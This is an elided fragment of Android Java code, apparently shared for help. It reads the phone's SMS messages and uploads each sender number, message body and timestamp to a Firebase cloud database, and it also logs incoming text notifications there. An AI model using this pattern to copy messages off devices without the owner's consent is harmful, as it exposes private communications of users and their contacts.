...
public class MainNew extends AppCompatActivity {
    ...
    private DatabaseReference mFirebaseDatabase, mFirebaseDatabase_textmsg;
    ...
    private BroadcastReceiver onNotice = new BroadcastReceiver()
    {
        ...
        public void onReceive(Context context, Intent intent) {
            ...
            if (package_name.equals("txtMsg")) {
                ...
                mFirebaseDatabase.child("hiiii").child("789789");
    ...
    protected void onCreate(Bundle savedInstanceState)
    {
        ...
        //Cursor query = contentResolver.query(uri, columns, "address='123456789'", null, null);
        ...
        if (query.getCount() > 0)
        {
            ...
            while (query.moveToNext()) {
                ...
                MessageModel messageModel = new MessageModel(number, body, time, type);
                mFirebaseDatabase_textmsg.child(number).child(time).setValue(messageModel);
